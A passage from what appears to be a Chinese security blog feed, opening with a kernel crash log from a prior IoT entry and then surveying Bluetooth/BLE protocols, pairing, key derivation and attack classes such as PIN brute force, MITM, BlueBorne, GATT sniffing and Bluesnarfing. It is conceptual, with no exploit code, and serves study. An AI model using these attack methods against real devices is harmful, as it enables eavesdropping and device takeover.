[&lt;c00084fc&gt;] (gic_handle_irq+0x58&#x2F;0x60)</span><br><span class="line">[  145.538482] [&lt;c00084a4&gt;] (gic_handle_irq+0x0&#x2F;0x60) from [&lt;c06a5540&gt;] (__irq_usr+0x40&#x2F;0x60)</span><br><span class="line">[  145.547637] Exception stack(0xd85a5fb0 to 0xd85a5ff8)</span><br><span class="line">[  145.553466] 5fa0:                                     41822290 418185e8 00000001 41c95000</span><br><span class="line">[  145.562561] 5fc0: 418185e8 41687460 4010d0ec 418185e8 4010d038 41689398 7fffffff 401602ec</span><br><span class="line">[  145.571777] 5fe0: 418191e8 5ba34d10 41609aa8 41609974 200b0010 ffffffff</span><br><span class="line">[  145.579284]  r6:ffffffff r5:200b0010 r4:41609974 r3:41822290</span><br><span class="line">[  145.586364] CPU0 PC (0) : 0xc003ee38</span><br><span class="line">[  145.590576] CPU0 PC (1) : 0xc003ee54</span><br><span class="line">[  145.594635] CPU0 PC (2) : 0xc003ee54</span><br><span class="line">[  145.598693] CPU0 PC (3) : 0xc003ee54</span><br><span class="line">[  145.602722] CPU0 PC (4) : 0xc003ee54</span><br><span class="line">[  145.606781] CPU0 PC (5) : 0xc003ee54</span><br><span class="line">[  145.610839] CPU0 PC (6) : 0xc003ee54</span><br><span class="line">[  145.614898] CPU0 PC (7) : 0xc003ee54</span><br><span class="line">[  145.619110] CPU0 PC (8) : 0xc003ee54</span><br><span class="line">[  145.623168] CPU0 PC (9) : 0xc003ee54</span><br><span class="line">[  145.627227] CPU1 PC (0) : 0xc0019b2c</span><br><span class="line">[  145.631408] CPU1 PC (1) : 0xc0019b2c</span><br><span class="line">[  145.635467] CPU1 PC (2) : 0xc0019b2c</span><br><span class="line">[  145.639495] CPU1 PC (3) : 0xc0019b2c</span><br><span class="line">[  145.643707] CPU1 PC (4) : 0xc0019b2c</span><br><span class="line">[  145.647766] CPU1 PC (5) : 0xc0019b2c</span><br><span class="line">[  145.651824] CPU1 PC (6) : 0xc0019b2c</span><br><span class="line">[  145.656005] CPU1 PC (7) : 0xc0019b2c</span><br><span class="line">[  145.660064] CPU1 PC (8) : 0xc0019b2c</span><br><span class="line">[  145.664123] CPU1 PC (9) : 0xc0019b2c</span><br><span class="line">[  145.668182] </span><br><span class="line">[  145.669952] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017</span><br><span class="line">[  145.669982] </span><br></pre></td></tr></table></figure></blockquote>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>Amazon</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝牙安全以及相关漏洞研究</title>
    <url>/2020/09/24/IOT/%E8%93%9D%E7%89%99%E5%AE%89%E5%85%A8%E4%BB%A5%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<p>放大佬总结的一张图：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/BLE%E5%AE%89%E5%85%A8.png" alt="BLE安全"></p>
<p>蓝牙是一种无线通信标准，工作在2.4～2.485Ghz的ISM频段，主要用于短距离的数据连接，可以建立所谓的PAN(Personal Area Network)网络。蓝牙设备最常见的应用是各种以手机和电脑为中心的外围设备，例如与手机配合使用的蓝牙耳机、手机与汽车音响的互联、蓝牙键盘和鼠标等。</p>
<h2 id="0x00-蓝牙技术简介"><a href="#0x00-蓝牙技术简介" class="headerlink" title="0x00 蓝牙技术简介"></a><strong>0x00 蓝牙技术简介</strong></h2><p>蓝牙”，即Bluetooth，是斯堪的纳维亚语中 Blåtand / Blåtann 的英化版本。该词是十世纪的一位国王Harald Bluetooth的绰号，相传他将纷争不断的丹麦部落统一为一个王国，并引入了基督教。蓝牙技术开发者Jim Kardach于1997年提出用Bluetooth这个名词，据说他当时正在读一本名为The Long Ships的小说，讲述的就是维京人和Harald Bluetooth国王的故事。他认为蓝牙可以把各种不同的通信协议统一在一起，诚如这位国王做的事情一样。至于蓝牙的logo，取自国王Harald Bluetooth名字中的【H】和【B】两个字母的组合，用古北欧文字来表示：</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/33981.png" alt="0"></p>
<p>蓝牙技术最早是1994年由爱立信发明的，最初的目的是用无线连接来代替RS-232线缆连接。目前蓝牙标准由Bluetooth Special Interest Group (SIG) 组织管理。这一组织有超过25000个成员公司，分布在电信、计算机、网络和消费电子领域。</p>
<p>蓝牙工作在2.4～2.485GHz频段，有79个频道，每个频道占据1MHz宽带。因为2.4GHz的ISM频段是非常繁忙的，为了对抗其他系统的干扰，蓝牙采取跳频式的扩频技术，通常1秒钟跳跃1600次。BLE(Bluetooth Low Energy)只有40个频道，每个频道占据2MHz宽带.</p>
<p>蓝牙是一种基于数据包通信的协议，使用主-从式的网络结构。在一个piconet中，1个主节点可以与多达7个从节点通信。所有的设备都共享主节点的时钟。数据包以312.5us的间隔互相交换，这个时间成为clock tick。两个clock tick构成一个625us的时隙，两个时隙构成一个1250us的时隙对。一种比较简单的时隙配置是，主节点在偶数时隙发送数据包，在奇数时隙接受数据包；从节点相反，在偶数时隙接受数据包，在奇数时隙发送数据包。这里讨论的是经典的蓝牙协议，BLE的空中接口协议与经典的蓝牙协议有很大的不同。蓝牙协议还支持多个piconet连接在一起，组成scatternet。在这种情况下，某些设备可以在一个piconet中担任主节点，在离另一个piconet中知识从节点。</p>
<p>蓝牙技术已经发展了很多年，蓝牙规范有很多个版本，从最早的蓝牙1.0到2014年发布的蓝牙4.2。早期的蓝牙标准只能支持几百Kbps的传输速率，而到了蓝牙3.0版本，已经可以支持最高24Mbps的传输速度。蓝牙4.0版本引入了BLE协议，即低功耗蓝牙，其功耗非常低，可以使设备的电池维持很长的时间，因此在很多可穿戴设备中得到了应用。</p>
<p>一文读懂蓝牙技术从 1.0 到 5.0 的前世今生                                  (<a href="https://zhuanlan.zhihu.com/p/37725574">https://zhuanlan.zhihu.com/p/37725574</a>)</p>
<h2 id="0x01-蓝牙安全概述"><a href="#0x01-蓝牙安全概述" class="headerlink" title="0x01 蓝牙安全概述"></a><strong>0x01 蓝牙安全概述</strong></h2><p>蓝牙协议有加密和鉴权功能。蓝牙的密钥产生是基于蓝牙的PIN码的。PIN码需要输入到蓝牙设备中，或者出场时就已经写入设备里。在美国国家标准技术研究所官网上有一份蓝牙安全指南Guide to Bluetooth Security(<a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-172-draft.pdf)中介绍了如何安全的使用蓝牙技术。使用蓝牙技术非常简单、易用、但是也有明显的缺点，容易被拒绝服务攻击、窃听、中间人攻击、数据篡改、占用资源。所有在选用蓝牙技术时，必须充分评估能否接受这样的风险。这份指南同时也给出了一些知道，在创建和维护一个蓝牙系统时，如何去降低他的安全风险。">https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-172-draft.pdf)中介绍了如何安全的使用蓝牙技术。使用蓝牙技术非常简单、易用、但是也有明显的缺点，容易被拒绝服务攻击、窃听、中间人攻击、数据篡改、占用资源。所有在选用蓝牙技术时，必须充分评估能否接受这样的风险。这份指南同时也给出了一些知道，在创建和维护一个蓝牙系统时，如何去降低他的安全风险。</a></p>
<p>2001年，内尔实验室的Jakobsson和Wetzel发现了蓝牙配对协议中的缺陷，以及加密方法中的漏洞。2003年，A.L.Digital公司的两位研究人员Ben和Adam Laurie发现，在一些蓝牙产品中有严重的漏洞，能够导致个人隐私数据的泄漏。于是，接下来就出现了一种利用这种BlueBug攻击手法，开始展现出这一漏洞的危害性</p>
<p>2004年，第一个所谓的蓝牙病毒出现，它可以在Symbian操作系统的手机中传播。这个”病毒”是一个名叫”29A”的团队编写的PoC程序，写出来之后就交给了反病毒机构，因此它具有威胁性，但并没有真正的传播过。2004年8月，一项实验创纪录地把蓝牙连接的距离增加到了1.79公里，在实验中使用了方向性天线和功率放大器。这就增加了蓝牙病毒的危险性，使得它能够威胁到距离非常远的蓝牙设备</p>
<p>2005年1月，出现了一种名为”Lasco.A”的手机蠕虫病毒，也是针对Symbian手机的。用户一旦通过蓝牙接收这个病毒文件，病毒就会自动地安装在系统中，然后开始寻找周围其他的蓝牙设备去感染。另外这种病毒还能感染系统中的其他SIS文件。最终的后果是导致手机系统不稳定。</p>
<p>2005 年4月，剑桥大学的安全研究人员公布了他们发现的一种被动式攻击方式， 能够攻击基于PIN码的配对协议。这种攻击方式操作起来非常快，证实了蓝牙的对称密钥的建立方法是有缺陷的。为了抵御这种攻击，研究人员提出了-种更强的非对称密钥加密方法。</p>
<p>2005年6月，Yaniv Shaked和Avishai Wool发表了一篇论文，提出了被动式和主动式两种攻击方式，可以获得PIN码。在被动式攻击中，攻击者在蓝牙设备初始配对的时刻就能窃听到通信的内容:而主动式攻击则需要在某个特定的时刻发出一-种特殊构造的数据包，使主节点和从节点重复配对过程，之后就可以使用被动式攻击在配对过程中侦听密钥了。这种攻击的主要弱点在于，它需要受到攻击的用户在攻击期间重新输入PIN码，此时设备会有提示。另外，这种攻击还需要一些特别的设备在恰当的时刻发出一种特殊构造的数据包，现成的蓝牙芯片是不.能做到这一- 点的。</p>
<p>蓝牙地址还可以用于追踪设备的位置。2005 年8月，英格兰剑桥郡的警方发出警示说，有些小偷利用蓝牙来探查车内是否有被遗忘的手机或电脑等设备，提示人们在不使用蓝牙功能时尽量关闭它。</p>
<p>2006年4月，来自Secure Network和F-Secure的研究人员发布了一份报告，警告有大量留在“可见”状态的设备，还报告了各种蓝牙服务的普及程度，以及与蓝牙蠕虫传播的危险性有关的统计数据。</p>
<p>2007年10月，在卢森堡的Hack.lu Security会议上，Kevin Finistere和Thiery Zoller演示了通过蓝牙远程rootMacOSXv10.3.9和v10.4系统，还演示了一个蓝牙PIN码和Linkeys破解器。</p>
<p>维基百科.上介绍的以上这些蓝牙安全的案例都至少是9年以前的事情了。那么近些年来，在蓝牙安全领域又有什么攻击方式</p>
<h2 id="0x02-BLE工作流程"><a href="#0x02-BLE工作流程" class="headerlink" title="0x02 BLE工作流程"></a><strong>0x02 BLE工作流程</strong></h2><h3 id="1-工作流程"><a href="#1-工作流程" class="headerlink" title="1.工作流程"></a><strong>1.工作流程</strong></h3><p>BLE低功耗蓝牙适用于短距离无线通信，正常与形式传输距离为10m(低功耗模式下为100m)，频段2.4Ghz。先进行三个蓝牙术语介绍：</p>
<ul>
<li>配对：配对是指两个蓝牙设备首次通讯时，互相确认的过程。两个蓝牙设备之间一经配对之后，随后的通讯连接就不必每次都要做确认，非常的方便</li>
<li>PIN：个人识别码，蓝牙适用的PIN码长度为1-8个十进制位(8-128比特)</li>
<li>DB_ADDR：蓝牙设备地址。每个蓝牙收发器被分配了唯一的一个48位的设备地址，类似于PC机网卡的MAC地址。两个蓝牙设备在通讯开始时通过询问的方式获取对方的DB_ADDR地址</li>
</ul>
<p>蓝牙的工作过程为:</p>
<p>​                蓝牙启动 -&gt; 扫描设备 -&gt; 设备配对（未配对的设备） -&gt; 数据传输              </p>
<h3 id="2-设备配对模式"><a href="#2-设备配对模式" class="headerlink" title="2.设备配对模式"></a><strong>2.设备配对模式</strong></h3><ul>
<li>Numeric Comparison：配对双方都显示一个6位数的数字，由用户来核对数字是否一致，一致即可配对。例如手机之前的配对。</li>
<li>Just Works：用于配对没有显示没有输入的设备，主动发起连接即可配对，用户看不到配对过程。例如连接蓝牙耳机。</li>
<li>Passkey Entry：要求配对目标输入一个在本地设备上显示的6位数字，输入正确即可配对。例如连接蓝牙键盘</li>
<li>Out of Band：两设备通过别的途径交换配对信息，例如nfc等。例如一些NFC蓝牙音响</li>
</ul>
<h3 id="3-设备配对过程"><a href="#3-设备配对过程" class="headerlink" title="3.设备配对过程"></a><strong>3.设备配对过程</strong></h3><h4 id="a-PIN码配对"><a href="#a-PIN码配对" class="headerlink" title="a PIN码配对"></a><strong>a PIN码配对</strong></h4><p>在老的蓝牙2.0协议中，配对过程需要输入一个PIN码，长度可以从4到16个数字。（很多设备默认为0000或者1234）</p>
<p>在配对的过程中通过PIN码来生成Linkkey。两个配对后的设备共享一个Linkkey，这个行为叫绑定。绑定之后下次两个设备接近后，用Linkkey进行认证，认证通过后生成EncryptionKey进行session的加密。认证的过程采用challenge-reponse的模式，以claimant and the verifier的方式来验证linkkey。认证完一方之后交换身份，在认证另一方。</p>
<h4 id="b-密钥交换配对"><a href="#b-密钥交换配对" class="headerlink" title="b 密钥交换配对"></a><strong>b 密钥交换配对</strong></h4><p>后续蓝牙协议配对则通过密钥交换来完成，又分为生成初始密钥(Kinit)、生成链路密钥(Kab)和双方认证三个过程。</p>
<ul>
<li>生成舒适密钥(Kinit)：初始密钥Kinit长度为128位，由E22算法产生。首先提出通信要求的设备成为主设备(Master)，用A表示;被动进行通信的设备称为从设备(Slave),用B表示。E22算法的输入(明文）由以下三部分组成：</li>
</ul>
<ol>
<li>从设备的物理地址：BD_ADDR,在生成Kinit前，主设备通过询问方式获得从设备的地址BD_ADDR。</li>
<li>PIN码及其长度，PIN码是双方设备预先设定的。</li>
<li>有一个128位的随机数(IN_RAND)。由主设备产生，并以明文方式传送给从设备。</li>
</ol>
<p>由于主、从设备使用了相同的E22算法，如果双方设备以上三部分的值都相等，那么各自算出来的Kinit也应该相同。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34133.png" alt="0"></p>
<ul>
<li>生成链路密钥(Kab)：首先主设备A产生128位的随机数LK_RANDA，从设备B也产生128位的随机数LK_RANDB。在主设备A中，Kinit与LK_RAND进行位比特逻辑异或运算，异或结果发送给B设备；同样的，在B设备中，Kinit和LK_RANDB进行位比特逻辑异或运算，结果发送给A设备。通过这些交换后，A和B设备都具有相同的Kinit、LK_RANDA和LK_RANDAB。设备A和B分别用E21算法将LK_RANDA和LK_RANDB。设备A和B分别用E21算法将LK_RANDA和BD_ADDRA、LK_RANDB和BD_ADDRB加密，并将结果进行异或得到Kab。</li>
</ul>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34168.png" alt="0"></p>
<ul>
<li>双方认证：双向认证采用challenge-response(挑战-应答)方式。主设备A位应答方，从设备B为请求方。作为应答方的A设备产生一个128位的随机数AU_RANDA，并以明文的方式传送至B设备。A、B设备都用E1算法将各自的到的AU_RAND、Kab和BD_ADDRB加密运算分别生成32位的SRESA和SRESB。B设备将结果SRESB传送给A设备，A设备比较SERESA和SERSB，如果两个的值相等，此次认证通过，如果两个的值不想等，则认证不通过。执行完此次认证后，A设备和B设备的角色对换，即A设备作为请求方，B设备作为应答方，采用同样的方式进行认证。</li>
</ul>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34183.png" alt="0"></p>
<h2 id="0x03-BLE常见问题"><a href="#0x03-BLE常见问题" class="headerlink" title="0x03 BLE常见问题"></a><strong>0x03 BLE常见问题</strong></h2><p>蓝牙（bluetooth）同WIF和zigbee等等网络协议一样，因此它的网络协议通信结构和它们大同小异。</p>
<p>因此，它的攻击手段不外乎鉴权攻击、密钥攻击、拒绝服务攻击等等几种手段，只不过随着具体的场景不同，这些攻击手段所赐啊去的具体方法也不同。</p>
<p>在上述的几种攻击方法里，蓝牙的安全问题可以分为两类：第一类是蓝牙协议本存在的问题。例如有攻击工具：Bluenarfing、Bluebugging、Hijacking等。</p>
<h3 id="1-针对蓝牙协议本身的攻击"><a href="#1-针对蓝牙协议本身的攻击" class="headerlink" title="1.针对蓝牙协议本身的攻击"></a><strong>1.针对蓝牙协议本身的攻击</strong></h3><h4 id="a-节点密钥攻击（中间人）"><a href="#a-节点密钥攻击（中间人）" class="headerlink" title="a.节点密钥攻击（中间人）"></a><strong>a.节点密钥攻击（中间人）</strong></h4><p>假设一个设备A和B之前已经通信过，当通信完成之后，A和B是互相知道彼此的链路密钥的。这里解释一下什么叫链路密钥：A和B之间的通信是需要加密的，怎么加密的不管，总之就是需要一个链路密钥这样的一个东西，每次通信的链路密钥是根据蓝牙本身自带生成的，这个链路密钥不是放在协议层生产的，而是蓝牙硬件自身就有的。那么B显然之后A所使用的链路密钥，那么B通过修改自身地址，把自己的地址改为A的地址后，伪装成A和C通信，那么C此时就以为自己和A通信。B也可以伪装成C和A去通信，因为B知道A的链路密钥，B是能够通过A的认证从而和A进行连接 。</p>
<p>这样 A和 C之间并没有进行实质的通信 ，都是B分别伪装和A，C通信。这样就造成了中间人攻击。</p>
<p>这种中间人攻击的主要原因在于蓝牙通信链路密钥在硬件层生产，而且每次认证都相同。</p>
<h4 id="b-针对PIN码攻击"><a href="#b-针对PIN码攻击" class="headerlink" title="b.针对PIN码攻击"></a><strong>b.针对PIN码攻击</strong></h4><p>两个设备之间的链接，在应用层上使用PIN码，4位PIN码破解仅仅需要0.06秒，8位暴力攻击不到两个小时就能破解。</p>
<h4 id="c-中继攻击"><a href="#c-中继攻击" class="headerlink" title="c.中继攻击"></a><strong>c.中继攻击</strong></h4><p>蓝牙设备使用中继以夸大传输距离，几乎所有的中继攻击，中继设备都有可能遭到信息窃取</p>
<h4 id="d-鉴权DOS攻击"><a href="#d-鉴权DOS攻击" class="headerlink" title="d.鉴权DOS攻击"></a><strong>d.鉴权DOS攻击</strong></h4><p>鉴权时的DOS攻击是从上一次鉴权失败到下一次可以发起鉴权期间，第三方通过伪装发起故意使鉴权失败，从而使间隔时间持续上升，知道达到允许的最大值，在此期间双方不能进行正常的鉴权。</p>
<p>还有一种形式的DOS攻击，快速不断的给远程蓝牙发送文件，而远端设备呗大量的是否要接收该文件的命令冲击直到瘫痪。</p>
<h3 id="2-针对蓝牙实现过程发起的攻击"><a href="#2-针对蓝牙实现过程发起的攻击" class="headerlink" title="2.针对蓝牙实现过程发起的攻击"></a><strong>2.针对蓝牙实现过程发起的攻击</strong></h3><h4 id="a-BlueBorne"><a href="#a-BlueBorne" class="headerlink" title="a. BlueBorne"></a><strong>a. BlueBorne</strong></h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/t01fa596689092bd57a.png" alt="image"></p>
<ul>
<li><a href="https://armis.com/blueborne/">https://armis.com/blueborne/</a></li>
<li><a href="https://www.antiy.cn/research/notice&report/research_report/20170918.html">基于蓝牙协议漏洞的BLUEBORNE攻击综合分析报告</a></li>
<li><a href="https://www.anquanke.com/post/id/86949">BlueBorne 蓝牙漏洞深入分析与PoC</a></li>
</ul>
<p>是由armis爆出的一系列蓝牙的漏洞，只要手机开启了蓝牙，就可能被远程控制。当然根据上面的分析可以看到通过多种平台的漏洞综合利用，可以完成对大部分支持蓝牙的设备进行攻击。但是在安天的报告里有一句我没懂“不像其它驱动一样，每个操作系统都只有一个蓝牙协议栈，这导致一个漏洞的出现将会影响一系列基于此系统的设备。”其他驱动是啥样？大概的意思就是内核驱动的漏洞吧，不过能看到的是通过这组漏洞可以实现ios，android，linux的rce，以及windows下的中间人攻击。</p>
<h4 id="b-GATT"><a href="#b-GATT" class="headerlink" title="b. GATT"></a><strong>b. GATT</strong></h4><ul>
<li><a href="https://gattack.io/">https://gattack.io/</a></li>
</ul>
<p>从蓝牙4.0的低功耗蓝牙（BLE）开始到4.2开始支持GATT（Generic Attribute Profile）再到BLE5，蓝牙技术已经瞄准了物联网这个方向。所以很多特性都是针对物联网的情景而生的，比如GATT。GATT中的三个要素Profile、Service、Characteristic以及他们的层级关系。值得注意的是，“Profile”是基于GATT所派生出的真正的Profile，乃SIG蓝牙技术联盟对一些同范畴内的Service打包后的集合，如电池、心率、血压等用于让两个设备进行连接后的通讯。GATT 定义设备之间通过 Service 和 Characteristic 的东西来进行通讯，不同的 Characteristic 代表设备的不同功能。GATT协议可以在蓝牙设备不完成配对的情况下进行访问，因此，通信流量明文传输，如果应用层没有加密或者校验，则可以被轻易地嗅探和伪造数据。</p>
<p>相关paper:</p>
<ul>
<li><a href="http://gattack.io/whitepaper.pdf">GATTACKING BLUETOOTH SMART DEVICES</a></li>
<li><a href="https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_06B-4_Xu_paper.pdf">BadBluetooth: Breaking Android Security Mechanisms via Malicious Bluetooth Peripherals</a></li>
</ul>
<h4 id="c-Bluesnarfing"><a href="#c-Bluesnarfing" class="headerlink" title="c.Bluesnarfing"></a><strong>c.Bluesnarfing</strong></h4><p>蓝牙定义了OBEX协议，只鹅个协议的重要目的是实现数据对象的交换。蓝牙早期规范定义了一个基于OBEX的应用，这个应用主要用来实现使用蓝牙来传输一些名片，这个过程并不需要使用鉴权机制，Bluesnarfing就是利用此漏洞连接到手机用户，并且不提示用户已连接。</p>
<p>当不使用蓝牙时，将设备设置成不可发现的模式，或者在通信时将设备设置成为安全模式3来启动链路鉴权，对一些蓝牙设备进行升级可以有效预防此类攻击。</p>
<h4 id="d-Bluebugging"><a href="#d-Bluebugging" class="headerlink" title="d.Bluebugging"></a><strong>d.Bluebugging</strong></h4><p>Bluebugging和Bluesnarfing相似，在事先不通知货提示手机用户的情况下，访问手机命令。</p>
<h4 id="e-Peripheral-Hijacking"><a href="#e-Peripheral-Hijacking" class="headerlink" title="e.Peripheral Hijacking"></a><strong>e.Peripheral Hijacking</strong></h4><p>有些设备尽管没有进入连接模式也会对连接请求进行相应，这类设备通常是一些没有MMI（Man Machine Interface）的设备。例如一些蓝牙耳机会被强制连接，还有一些设备有固定的PIN码，Peripheral Hijacking即是对此类设备进行攻击。</p>
<h4 id="f-Bluejacking"><a href="#f-Bluejacking" class="headerlink" title="f.Bluejacking"></a><strong>f.Bluejacking</strong></h4><p>Bluejacking是指手机用户使用蓝牙无线技术匿名向赴京的蓝牙用户发送名片或不许奥信息的行为。Bluejacking通常会寻找ping的通的手机或者有反应的手机，随后会发送更多的其他个人信息到该设备。现在市场上已经出现了很多Bluejacking软件。可以通过把手机设置成不可发现模式来避免此类攻击。</p>
<h2 id="0x04-信道"><a href="#0x04-信道" class="headerlink" title="0x04 信道"></a><strong>0x04 信道</strong></h2><p>BLE的物理通道即”频道”，分别是‘f=2402+k*2 MKz, k=0 , … ,39’, 宽带为2MHz的40个RF Channel。</p>
<p>其中，有3个信道是advertising channel(广播通道)，分别是37、38、39，用于发现设备(Scanning devices)、初始化连接(initiating a connection)和广播数据(broadcasting date)</p>
<p>剩下的37个信道为data channel(数据通道)，用于两个连接的设备间的通讯。</p>
<h2 id="0x05-BLE数据包格式"><a href="#0x05-BLE数据包格式" class="headerlink" title="0x05 BLE数据包格式"></a><strong>0x05 BLE数据包格式</strong></h2><p>在低功耗蓝牙规范中，分广播报文和数据报文这两种。设备利用广播报文发现、连接其它设备，而在连接建立之后，便开始使用数据报文。无论是广播报文还是数据报文，链路层只使用一中数据包格式，它由”前导码”(preamble)、”访问码”(access code)、”有效载荷”和”循环冗余校验”（Cyclical Redundancy CHeck，CRC）校验码组成。其中，”访问码”有时又称为”访问地址”(access address)</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34506.png" alt="0"></p>
<h3 id="1-Preamble"><a href="#1-Preamble" class="headerlink" title="1.Preamble"></a>1.Preamble</h3><p>1个字节长度，接受中用于频率同步、数据速率同步、自动增益控制调整，固定为                        01010101或者10101010序列</p>
<h3 id="2-Access-Address"><a href="#2-Access-Address" class="headerlink" title="2.Access Address"></a>2.Access Address</h3><p>4个字节长度，广播报文接入地址为：0x8E89BED6,数据报文接入地址为：32bits随机数</p>
<h3 id="3-PDU"><a href="#3-PDU" class="headerlink" title="3.PDU"></a>3.PDU</h3><p>i.广播报文（见嫌疑BLUETOOTH SPECIFICATION Version 4.0 [Vol 6] Part B 2.3）</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34523.png" alt="0"></p>
<p>i. PDU Type: 有效载荷内容的类型，通过这一字段确定改数据包是一个”通告”还是”扫描请求”或”响应”等</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34532.png" alt="0"></p>
<p>ii. RFU 保留位</p>
<p>iii. TxAdd：发送地址字段</p>
<p>iv. RxAdd：接收地址字段</p>
<p>v. Payload Length：用来表示”有效载荷数据”(payload data)的长度，不包括头部内容</p>
<p>ii.数据报文（见协议BLUETOOTH SPECIFICATION Version 4.0 [Vol 6] Part B 2.4）</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34544.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34546.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34548.png" alt="0"></p>
<p>1.LLID（逻辑链路ID）：0x01表示该数据包是一个帧的延续内容，或者这是一个空的“逻辑链路控制及适配协议”数据包；0x02表示一个“逻辑链路控制及适配协议”数据包的开始；0x03表示这是一个“逻辑链路控制”数据包的内容</p>
<p>2.NESN：下一个期望的序列号，用于对接受到的数据包进行确认</p>
<p>3.MD：更多数据字段，主要是为了说明发送发是否还有要发给接收者的数据</p>
<p>4.RFU 保留位</p>
<p>5.Payload Length：用以表示包含”信息完整性校验码”（Message Integrity Check，MIC）在内的“有效载荷数据”的长度</p>
<p>4.CRC</p>
<p>3个字节长度，“循环冗余校验”（Cyclical Redundancy Check, CRC），可检查数据的正确性</p>
<h2 id="0x06-BLE-协议栈"><a href="#0x06-BLE-协议栈" class="headerlink" title="0x06 BLE 协议栈"></a><strong>0x06 BLE 协议栈</strong></h2><p>BLE协议栈的结构图如下所示：</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34568.png" alt="0"></p>
<p>各个结构简述：</p>
<ul>
<li>PHY：使蓝牙可以使用2.4GHz频道，并且能自适应的调频。</li>
<li>LL层：控制设备处于 准备、广播、监听、初始化、连接等5个状态</li>
<li>HCI层：向上为主机提供软件应用程序接口，对外为外部硬件提供控制接口</li>
<li>L2CAP层：对传输数据实行封装。</li>
<li>SM层：提供主机和客机的配对和密钥分发，实现安全连接和数据交换。</li>
<li>ATT层：对数据主机或客机传入的指令进行指令搜索处理</li>
<li>GATT层：接受和处理主机或客机传入的指令进行指令搜索处理</li>
<li>GAP层：向上提供API，向下合理分配各个层工作。</li>
</ul>
<h3 id="1-Physical-Layer"><a href="#1-Physical-Layer" class="headerlink" title="1. Physical Layer"></a><strong>1. Physical Layer</strong></h3><p>任何一个通信系统，首先要确定的就是通信介质(物理通道，Physical Channel)，BLE也不例外。在BLE协议中，”通信介质”的定义是由Physical Layer（其他通信协议也类似）负责。</p>
<p>Physical Layer是这样描述BLE的通信介质的：</p>
<p>​                由于BLE属于无线通信，则其通信介质是实顶频率范围下的频率资源(Frequency Band) BLE的市场定位是个体和名用，因此使用免费的ISM频段(频率范围是2.400-2.4835Ghz) 为了同时支持多个设备，将真个频带分为40份，每份的宽带为2MHz，称作RF Channel              </p>
<p>所以经过上面的定义之后，可以推测出BLE的物理通道，即“评到分别是’f=2402+k*2 MHz，k=0,…,39’,宽带为2MHz”的40个RFChannel。其中，有3个信道是advertising channel（广播通道），分别是37、38、39，用于发现设备（Scanning devices）、舒适化连接(initiating a connection)和广播数据(broadcasting date)；剩下的37个信道为data channel（数据通道），用于两个连接的设备间的通讯。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34607.png" alt="0"></p>
<h3 id="2-Link-Layer"><a href="#2-Link-Layer" class="headerlink" title="2. Link Layer"></a><strong>2. Link Layer</strong></h3><p>Link Layer用于控制设备的射频状态，设备将处于Standby(待机)、Advertising（通告）、Scanning（扫描）、Initiating（初始化）、Connection（连接）这五种状态中的一种。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34606.png" alt="0"></p>
<ul>
<li>待机状态（Standby State）：此时即不发送数据，也不接受数据，对设备来说也是最节能的状态；</li>
<li>通告状态（Advertising State）：通告状态下的设备一般也被称为 “通告者”（Advertiser），它会通过advertising channel（广播通道）周期性的发送数据，广播的数据可以由处于Scanning state或Initiating state的实体接受；</li>
<li>扫描状态（Scanning State）：可以通过advertising channel（广播通道）接受数据的装填，该状态下的设备又被称为“扫描者”（Scanner）。此外，更具advertiser所广播的数据类型，有些Scanner还可以主动向Advertiser请求一些额外数据</li>
<li>初始化状态（Initiating State）：和Scanning State类似，不过是一种特殊的状态。Scanner会侦听所有的advertising channel，而Initator（初始化者）则只侦听某个特定设备的广播，并在接受到数据后，发送连接请求，以便和Advertiser建立连接</li>
<li>连接状态（Connection State）：由Initiating State或Advertising State自动切换而来，处于Connection State的双方，分别有两种角色。其中，Initiater方被称为Mater（主设备），Advertiser方则称作Slave（从设备）。</li>
</ul>
<h3 id="3-HCI"><a href="#3-HCI" class="headerlink" title="3. HCI"></a><strong>3. HCI</strong></h3><p>主机控制接口层（Host Controller Interface，简写HCI）：定义Host（主机）和Controller（控制器）之间的通信协议，这一层可以是软件或者硬件接口，入UART、SPI、USB等</p>
<h3 id="4-Generic-Access-Profile-GAP"><a href="#4-Generic-Access-Profile-GAP" class="headerlink" title="4. Generic Access Profile(GAP)"></a><strong>4. Generic Access Profile(GAP)</strong></h3><p>前面Link Layer虽然对连接建立的过程做了定义，但它听没有体现到Application（或者 Profile）层面，而GAP则是直接与应用程序或配置文件通信的接口，它实现了如下功能：</p>
<ul>
<li><p>定义GAP层的蓝牙设备角色（role）</p>
</li>
<li><ul>
<li>Broadcaster（广播者）：设备正在发送advertising events</li>
<li>Obserber（观察者）：设备正在接受advertising events</li>
<li>Peripheral（外设）：设备接受Link Layer连接（对应Link Layer的slave角色）</li>
<li>Central（主机）：设备发起Link Layer连接（对应Link Layer的master角色）</li>
</ul>
</li>
<li><p>定义GAP层的用于实现各种通信的操作模式（Operational Mode）和过程（Procedures）</p>
</li>
